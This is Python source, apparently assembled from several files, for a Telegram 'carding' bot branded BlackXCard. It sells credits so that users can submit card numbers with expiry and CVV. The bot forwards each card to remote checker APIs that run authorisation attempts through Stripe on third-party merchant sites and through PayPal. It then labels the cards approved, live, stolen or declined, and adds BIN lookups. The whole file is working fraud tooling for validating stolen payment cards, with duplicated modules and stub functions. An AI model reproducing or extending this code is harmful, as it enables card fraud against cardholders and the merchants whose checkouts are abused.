            escape_markdown_v2("❌ Invalid command usage. Correct usage: /adcr [user_id] [no. of credits]"),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    try:
        user_id = int(context.args[0])
        credits_to_add = int(context.args[1])

        if credits_to_add <= 0:
            return await update.effective_message.reply_text(
                escape_markdown_v2("❌ The number of credits must be a positive integer."),
                parse_mode=ParseMode.MARKDOWN_V2
            )
    except ValueError:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ Both the user ID and number of credits must be valid numbers."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Fetch the target user's data
    target_user_data = await get_user(user_id)

    if not target_user_data:
        return await update.effective_message.reply_text(
            escape_markdown_v2(f"❌ User with ID {user_id} not found in the database."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Update the user's credits
    new_credits = target_user_data.get('credits', 0) + credits_to_add
    await update_user(user_id, credits=new_credits)

    # Send a confirmation message with proper monospace formatting and escaping
    # The f-string is escaped here to handle the periods correctly.
    final_message = escape_markdown_v2(f"✅ Successfully added {credits_to_add} credits to user {user_id}. Their new credit balance is {new_credits}.")

    await update.effective_message.reply_text(
        final_message,
        parse_mode=ParseMode.MARKDOWN_V2
    )


from telegram import Update
from telegram.ext import ContextTypes
from bin import get_bin_info  # Import your BIN fetching logic
import html

# ===== Config =====
BULLET_GROUP_LINK = "https://t.me/+EwCcMzxhQ6Y3MTQ0"
DEVELOPER_NAME = "𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™"
DEVELOPER_LINK = "tg://resolve?domain=BlinkCarder"

# ===== Utilities =====
def get_level_emoji(level: str) -> str:
    """Return a matching emoji for card level/category."""
    mapping = {
        "classic": "💳",
        "gold": "🥇",
        "platinum": "💠",
        "business": "🏢",
        "world": "🌍",
        "signature": "✍️",
        "infinite": "♾️"
    }
    return mapping.get(level.lower(), "💳")


def safe(field):
    """Return field or 'N/A' if None."""
    return field or "N/A"


# ===== /bin Command =====
async def bin_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Performs a BIN lookup and shows full info using clickable bullets."""
    user = update.effective_user

    # Clickable bullet
    bullet_link = f'<a href="{BULLET_GROUP_LINK}">⩙</a>'
    developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"

    # Parse BIN input
    bin_input = None
    if context.args:
        bin_input = context.args[0]
    elif update.effective_message and update.effective_message.text:
        parts = update.effective_message.text.split(maxsplit=1)
        if len(parts) > 1:
            bin_input = parts[1]

    if not bin_input or not bin_input.isdigit() or len(bin_input) < 6:
        return await update.effective_message.reply_text(
            "❌ Please provide a valid 6-digit BIN. Usage: /bin [bin]",
            parse_mode="HTML"
        )

    bin_number = bin_input[:6]

    try:
        # Fetch BIN info
        bin_details = await get_bin_info(bin_number)

        brand = (bin_details.get("scheme") or "N/A").title()
        issuer = safe(bin_details.get("bank"))
        country_name = safe(bin_details.get("country"))
        country_flag = bin_details.get("country_emoji", "")
        card_type = safe(bin_details.get("type"))
        card_level = safe(bin_details.get("brand"))
        card_length = safe(bin_details.get("length"))
        luhn_check = safe(bin_details.get("luhn"))
        bank_phone = safe(bin_details.get("bank_phone"))
        bank_url = safe(bin_details.get("bank_url"))

        level_emoji = get_level_emoji(card_level)

        # Build BIN info message
        bin_info_box = (
            f"✦━━━[ <b>𝐁𝐈𝐍 𝐈𝐍𝐅𝐎</b> ]━━━✦\n"
            f"{bullet_link} <b>BIN</b> ➳ <code>{bin_number}</code>\n"
            f"{bullet_link} <b>Scheme</b> ➳ <code>{html.escape(brand)}</code>\n"
            f"{bullet_link} <b>Type</b> ➳ <code>{html.escape(card_type)}</code>\n"
            f"{bullet_link} <b>Brand</b> ➳ {level_emoji} <code>{html.escape(card_level)}</code>\n"
            f"{bullet_link} <b>Issuer/Bank</b> ➳ <code>{html.escape(issuer)}</code>\n"
            f"{bullet_link} <b>Country</b> ➳ <code>{html.escape(country_name)} {country_flag}</code>\n"
            f"{bullet_link} <b>Requested By</b> ➳ {user.mention_html()}\n"
            f"{bullet_link} <b>Bot By</b> ➳ {developer_clickable}\n"
        )

        # Send BIN info
        await update.effective_message.reply_text(
            bin_info_box,
            parse_mode="HTML",
            disable_web_page_preview=True
        )

    except Exception as e:
        await update.effective_message.reply_text(
            f"❌ Error fetching BIN info: {html.escape(str(e))}",
            parse_mode="HTML"
        )










from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Replace with your *legit* group/channel link
BULLET_GROUP_LINK = "https://t.me/+EwCcMzxhQ6Y3MTQ0"

def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    import re
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the /credits command, showing user info and credits."""
    user = update.effective_user
    user_data = await get_user(user.id)

    # Make the bullet ⩙ fully clickable and visible
    bullet_text = "⩙"   # Yeh change karo  
    bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"

    credits = str(user_data.get('credits', 0))
    plan = user_data.get('plan', 'N/A')

    # Escape user inputs
    username = f"@{user.username}" if user.username else "N/A"
    escaped_username = escape_markdown_v2(username)
    escaped_user_id = escape_markdown_v2(str(user.id))
    escaped_plan = escape_markdown_v2(plan)
    escaped_credits = escape_markdown_v2(credits)

    credit_message = (
        f"💳 *Your Credit Info* 💳\n"
        f"✦━━━━━━━━━━━━━━✦\n"
        f"{bullet_link} Username: {escaped_username}\n"
        f"{bullet_link} User ID: `{escaped_user_id}`\n"
        f"{bullet_link} Plan: `{escaped_plan}`\n"
        f"{bullet_link} Credits: `{escaped_credits}`\n"
    )

    await update.effective_message.reply_text(
        credit_message,
        parse_mode=ParseMode.MARKDOWN_V2,
        disable_web_page_preview=True
    )






import time
import asyncio
import aiohttp
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown
from telegram.ext import ContextTypes
from bin import get_bin_info   # ✅ use the correct function
import re
import logging

# Import your database functions here
from db import get_user, update_user

logger = logging.getLogger(__name__)

# Global variable for user cooldowns
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 3) -> bool:
    """Enforces a cooldown period for a user to prevent spamming."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            escape_markdown(f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)} seconds.", version=2),
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False


def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))


# ===== BACKGROUND CHECK =====
import aiohttp
import html
from telegram.constants import ParseMode

async def background_check(cc_normalized, parts, user, user_data, processing_msg):
    import time
    start_time = time.time()

    try:
        # BIN lookup
        bin_number = parts[0][:6]
        bin_details = await get_bin_info(bin_number) or {}

        # Safely extract values
        brand = (bin_details.get("scheme") or "N/A").title()
        issuer = (
            bin_details.get("bank", "N/A")["name"]
            if isinstance(bin_details.get("bank"), dict)
            else bin_details.get("bank") or "N/A"
        )
        country_name = (
            bin_details.get("country", "N/A")["name"]
            if isinstance(bin_details.get("country"), dict)
            else bin_details.get("country") or "N/A"
        )
        country_flag = bin_details.get("country_emoji") or ""
        card_type = bin_details.get("type") or "N/A"
        card_level = bin_details.get("brand") or "N/A"

        # Call main API - UPDATED URL FORMAT
        api_url = (
            "https://stripe.stormx.pw/"
            f"gateway=autostripe/key=darkboy/site=chiwahwah.co.nz/cc={cc_normalized}"
        )
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=78) as resp:
                if resp.status != 200:
                    raise Exception(f"HTTP {resp.status}")
                data = await resp.json()

        # Extract status + response
        api_status = (data.get("status") or "Unknown").strip()
        api_response = (data.get("response") or "No response").strip()

        # Status formatting with emoji
        lower_status = api_status.lower()
        if "approved" in lower_status:
            status_text = "✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"
        elif "declined" in lower_status:
            status_text = "❌ DECLINED"
        elif "ccn live" in lower_status:
            status_text = "❎ CCN LIVE"
        elif "incorrect" in lower_status or "your number" in lower_status:
            status_text = "⚠️ INCORRECT"
        elif "3ds" in lower_status or "auth required" in lower_status:
            status_text = "🔒 3DS REQUIRED"
        elif "insufficient funds" in lower_status:
            status_text = "💸 INSUFFICIENT FUNDS"
        elif "expired" in lower_status:
            status_text = "⌛ EXPIRED"
        elif "stolen" in lower_status:
            status_text = "🚫 STOLEN CARD"
        elif "pickup card" in lower_status:
            status_text = "🛑 PICKUP CARD"
        elif "fraudulent" in lower_status:
            status_text = "⚠️ FRAUD CARD"
        else:
            status_text = f"ℹ️ {api_status.upper()}"

        # Handle missing first_name
        user_first = getattr(user, "first_name", None) or "User"

        # Time taken
        end_time = time.time()
        elapsed_time = round(end_time - start_time, 2)

        # Final text formatted for Telegram HTML
        final_text = (
            f"<b><i>{status_text}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝  \n"
            f"⤷ <code>{html.escape(cc_normalized)}</code>\n"            
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <b><code>{html.escape(api_response)}</code></b>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {html.escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {html.escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {html.escape(country_name)} {html.escape(country_flag)}"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ <a href=\"tg://resolve?domain=BlinkCarder\">𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™</a>\n"                   
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"     
        )

        # Send final message
        await processing_msg.edit_text(
            final_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )

    except Exception as e:
        await processing_msg.edit_text(
            f"❌ An error occurred: <code>{html.escape(str(e))}</code>",
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )

import re
import asyncio
import html
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Flexible pattern: separators can be |, /, :, or spaces
CARD_PATTERN = re.compile(
    r"\b(\d{13,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    # Get user data
    user_data = await get_user(user_id)
    if not user_data:
        await update.effective_message.reply_text("❌ Could not fetch your user data.", parse_mode=ParseMode.HTML)
        return

    # Check credits
    if user_data.get("credits", 0) <= 0:
        await update.effective_message.reply_text("❌ You have no credits left.", parse_mode=ParseMode.HTML)
        return

    # Cooldown check
    if not await enforce_cooldown(user_id, update):
        return

    card_input = None

    # 1️⃣ Command argument
    if context.args and len(context.args) > 0:
        raw_text = " ".join(context.args)
        match = CARD_PATTERN.search(raw_text)
        if match:
            card_input = match.groups()

    # 2️⃣ Reply to message
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = CARD_PATTERN.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    # No card input
    if not card_input:
        usage_text = (
            "🚫 <b>Usage:</b> /chk card|mm|yy|cvv\n"
            "Or reply to a message containing a card."
        )
        await update.effective_message.reply_text(usage_text, parse_mode=ParseMode.HTML)
        return

    # Normalize
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)
    yy = yy[-2:] if len(yy) == 4 else yy
    cc_normalized = f"{card}|{mm}|{yy}|{cvv}"

    # Deduct credit
    if not await consume_credit(user_id):
        await update.effective_message.reply_text("❌ No credits left.", parse_mode=ParseMode.HTML)
        return

    # Processing message
    processing_text = (
        "<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
        f"<pre><code>{html.escape(cc_normalized)}</code></pre>\n"
        "𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ #𝗦𝘁𝗿𝗶𝗽𝗲𝗔𝘂𝘁𝗵"
    )

    status_msg = await update.effective_message.reply_text(
        processing_text,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )

    # Background check
    asyncio.create_task(
        background_check(cc_normalized, [card, mm, yy, cvv], user, user_data, status_msg)
    )





import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
import re

# Import DB helpers
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False
    

## Stripe auth V2 ##
import time
import asyncio
import aiohttp
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown
from telegram.ext import ContextTypes
from bin import get_bin_info   # ✅ use the correct function
import re
import logging

# Import your database functions here
from db import get_user, update_user

logger = logging.getLogger(__name__)

# Global variable for user cooldowns
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 3) -> bool:
    """Enforces a cooldown period for a user to prevent spamming."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            escape_markdown(f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)} seconds.", version=2),
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False


def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))


# ===== BACKGROUND CHECK =====
import aiohttp
import html
from telegram.constants import ParseMode

async def background_check(cc_normalized, parts, user, user_data, processing_msg):
    import time
    start_time = time.time()

    try:
        # BIN lookup
        bin_number = parts[0][:6]
        bin_details = await get_bin_info(bin_number) or {}

        # Safely extract values
        brand = (bin_details.get("scheme") or "N/A").title()
        issuer = (
            bin_details.get("bank", "N/A")["name"]
            if isinstance(bin_details.get("bank"), dict)
            else bin_details.get("bank") or "N/A"
        )
        country_name = (
            bin_details.get("country", "N/A")["name"]
            if isinstance(bin_details.get("country"), dict)
            else bin_details.get("country") or "N/A"
        )
        country_flag = bin_details.get("country_emoji") or ""
        card_type = bin_details.get("type") or "N/A"
        card_level = bin_details.get("brand") or "N/A"

        # Call main API - UPDATED URL FORMAT
        api_url = (
            "https://stripe.stormx.pw/"
            f"gateway=autostripe/key=darkboy/site=dilaboards.com/cc={cc_normalized}"
        )
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=78) as resp:
                if resp.status != 200:
                    raise Exception(f"HTTP {resp.status}")
                data = await resp.json()

        # Extract status + response
        api_status = (data.get("status") or "Unknown").strip()
        api_response = (data.get("response") or "No response").strip()

        # Status formatting with emoji
        lower_status = api_status.lower()
        if "approved" in lower_status:
            status_text = "✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"
        elif "declined" in lower_status:
            status_text = "❌ DECLINED"
        elif "ccn live" in lower_status:
            status_text = "❎ CCN LIVE"
        elif "incorrect" in lower_status or "your number" in lower_status:
            status_text = "⚠️ INCORRECT"
        elif "3ds" in lower_status or "auth required" in lower_status:
            status_text = "🔒 3DS REQUIRED"
        elif "insufficient funds" in lower_status:
            status_text = "💸 INSUFFICIENT FUNDS"
        elif "expired" in lower_status:
            status_text = "⌛ EXPIRED"
        elif "stolen" in lower_status:
            status_text = "🚫 STOLEN CARD"
        elif "pickup card" in lower_status:
            status_text = "🛑 PICKUP CARD"
        elif "fraudulent" in lower_status:
            status_text = "⚠️ FRAUD CARD"
        else:
            status_text = f"ℹ️ {api_status.upper()}"

        # Handle missing first_name
        user_first = getattr(user, "first_name", None) or "User"

        # Time taken
        end_time = time.time()
        elapsed_time = round(end_time - start_time, 2)

        # Final text formatted for Telegram HTML
        final_text = (
            f"<b><i>{status_text}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝  \n"
            f"⤷ <code>{html.escape(cc_normalized)}</code>\n"            
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <b><code>{html.escape(api_response)}</code></b>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {html.escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {html.escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {html.escape(country_name)} {html.escape(country_flag)}"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ <a href=\"tg://resolve?domain=BlinkCarder\">𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™</a>\n"                   
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"     
        )

        # Send final message
        await processing_msg.edit_text(
            final_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )

    except Exception as e:
        await processing_msg.edit_text(
            f"❌ An error occurred: <code>{html.escape(str(e))}</code>",
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )

import re
import asyncio
import html
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Flexible pattern: separators can be |, /, :, or spaces
CARD_PATTERN = re.compile(
    r"\b(\d{13,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def sr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    # Get user data
    user_data = await get_user(user_id)
    if not user_data:
        await update.effective_message.reply_text("❌ Could not fetch your user data.", parse_mode=ParseMode.HTML)
        return

    # Check credits
    if user_data.get("credits", 0) <= 0:
        await update.effective_message.reply_text("❌ You have no credits left.", parse_mode=ParseMode.HTML)
        return

    # Cooldown check
    if not await enforce_cooldown(user_id, update):
        return

    card_input = None

    # 1️⃣ Command argument
    if context.args and len(context.args) > 0:
        raw_text = " ".join(context.args)
        match = CARD_PATTERN.search(raw_text)
        if match:
            card_input = match.groups()

    # 2️⃣ Reply to message
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = CARD_PATTERN.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    # No card input
    if not card_input:
        usage_text = (
            "🚫 <b>Usage:</b> /sr card|mm|yy|cvv\n"
            "Or reply to a message containing a card."
        )
        await update.effective_message.reply_text(usage_text, parse_mode=ParseMode.HTML)
        return

    # Normalize
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)
    yy = yy[-2:] if len(yy) == 4 else yy
    cc_normalized = f"{card}|{mm}|{yy}|{cvv}"

    # Deduct credit
    if not await consume_credit(user_id):
        await update.effective_message.reply_text("❌ No credits left.", parse_mode=ParseMode.HTML)
        return

    # Processing message
    processing_text = (
        "<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
        f"<pre><code>{html.escape(cc_normalized)}</code></pre>\n"
        "𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ #𝗦𝘁𝗿𝗶𝗽𝗲𝗔𝘂𝘁𝗵"
    )

    status_msg = await update.effective_message.reply_text(
        processing_text,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )

    # Background check
    asyncio.create_task(
        background_check(cc_normalized, [card, mm, yy, cvv], user, user_data, status_msg)
    )





import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
import re

# Import DB helpers
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False
        

import aiohttp
import asyncio
import json
import re
import logging
import time
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

logger = logging.getLogger(__name__)

async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    """
    Process /pp command: call PayPal gateway API and format the reply.
    Gateway label = PayPal, Price = 1$
    """
    start_time = time.time()
    try:
        user = update.effective_user

        # initial processing message - SIRF EGG EMOJI
        msg = await update.message.reply_text("⏳")

        # build API URL with proxy parameter
        api_url = f"http://103.131.128.254:8084/check?gateway=PayPal&key=BlackXCard&cc={payload}"

        # call API with 45 second timeout
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=45) as resp:
                    api_response_text = await resp.text()
        except asyncio.TimeoutError:
            await msg.edit_text("❌ Error: API request timed out (45s).", parse_mode=ParseMode.HTML)
            return
        except Exception as e:
            await msg.edit_text(
                f"❌ API request failed: <code>{escape(str(e))}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        # parse API JSON
        try:
            data = json.loads(api_response_text)
        except json.JSONDecodeError:
            await msg.edit_text(
                f"❌ Invalid API response:\n<code>{escape(api_response_text[:500])}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        # Extract response data from API (new format)
        status = data.get("status", "unknown").upper()
        response_msg = data.get("response", "No response")

        # Determine header status based on API response
        if status == "APPROVED":
            header_status = "✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿"
        elif status == "DECLINED":
            header_status = "❌ DECLINED"
        elif status == "PROXY_DEAD":
            header_status = "🔴 PROXY DEAD"
        else:
            header_status = f"💎 {status}"

        # Create response display
        response_display = f"{response_msg}"

        # Shorten response if too long
        if len(response_display) > 60:
            response_display = response_display[:60] + "..."

        # BIN lookup
        try:
            bin_number = payload.split("|")[0][:6]
            bin_details = await get_bin_info(bin_number) or {}
            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank", {}).get("name") if isinstance(bin_details.get("bank"), dict) else bin_details.get("bank", "N/A")
            country_name = bin_details.get("country", {}).get("name") if isinstance(bin_details.get("country"), dict) else bin_details.get("country", "Unknown")
            country_flag = bin_details.get("country_emoji", "")
        except Exception:
            brand = issuer = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # developer branding
        DEVELOPER_NAME = "𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™"
        DEVELOPER_LINK = "tg://resolve?domain=BlinkCarder"
        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'

        # elapsed time
        elapsed_time = round(time.time() - start_time, 2)

        # final message
        final_msg = (
            f"<b><i>{header_status}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝\n"
            f"⤷ <code>{escape(payload)}</code>\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝙋𝙖𝙮𝙋𝙖𝙡 1$\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{escape(response_display)}</code></i>\n\n"
            f"<pre>"
            f"𝑩𝒓𝒂𝒏𝒅 ↬ {escape(brand)}\n"
            f"𝑩𝒂𝒏𝒌 ↬ {escape(issuer)}\n"
            f"𝑪𝒐𝒖𝒏𝒕𝒓𝒚 ↬ {escape(country_name)} {country_flag}"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
        )

        await msg.edit_text(
            final_msg,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except Exception as e:
        try:
            await update.message.reply_text(
                f"❌ Error: <code>{escape(str(e))}</code>",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass

# BIN lookup function add karo
async def get_bin_info(bin_number):
    """Get BIN information from binlist.net"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://lookup.binlist.net/{bin_number}") as response:
                if response.status == 200:
                    data = await response.json()
                    return {
                        "scheme": data.get("scheme"),
                        "bank": data.get("bank", {}),
                        "country": data.get("country", {}),
                        "country_emoji": data.get("country", {}).get("emoji", "")
                    }
    except Exception:
        pass
    return None

# Cooldown function (agar nahi hai toh add karo)
async def enforce_cooldown(user_id, update):
    """Simple cooldown enforcement"""
    # Yaha aapka cooldown logic add karo
    return True

# Credit consumption function (agar nahi hai toh add karo)  
async def consume_credit(user_id):
    """Simple credit consumption"""
    # Yaha aapka credit logic add karo
    return True

# --- Main /pp command ---
import re
from telegram.constants import ParseMode
from telegram import Update
from telegram.ext import ContextTypes

# Flexible regex: allows |, /, :, or spaces as separators
PP_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def pp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # --- Cooldown check ---
    if not await enforce_cooldown(user.id, update):
        return

    card_input = None

    # --- Check arguments ---
    if context.args:
        raw_text = " ".join(context.args).strip()
        match = PP_CARD_REGEX.search(raw_text)
        if match:
            card_input = match.groups()

    # --- If no args, check reply message ---
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = PP_CARD_REGEX.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    # --- If still no payload ---
    if not card_input:
        await update.message.reply_text(
            "⚠️ Usage: <code>/pp card|mm|yy|cvv</code>\n"
            "Or reply to a message containing a card.",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Normalize ---
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)
    yy = yy[-2:] if len(yy) == 4 else yy
    payload = f"{card}|{mm}|{yy}|{cvv}"

    # --- Run in background ---
    asyncio.create_task(process_pp(update, context, payload))




import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
import re

# Import DB helpers
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False

# --- HC Processor ---
import aiohttp
import asyncio
import json
import re
import logging
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

logger = logging.getLogger(__name__)

async def process_st(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    """
    Process a /st command: check Stripe charge, display response and BIN info.
    Gateway label = Stripe, Price = 1$
    """
    import time
    start_time = time.time()

    try:
        user = update.effective_user

        # --- Consume credit ---
        if not await consume_credit(user.id):
            await update.message.reply_text("❌ You don't have enough credits left.")
            return

        # --- Extract card details ---
        parts = payload.split("|")
        if len(parts) != 4:
            await update.message.reply_text(
                "❌ Invalid format.\nUse: /st 1234567812345678|12|2028|123",
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return

        cc, mm, yy, cvv = [p.strip() for p in parts]
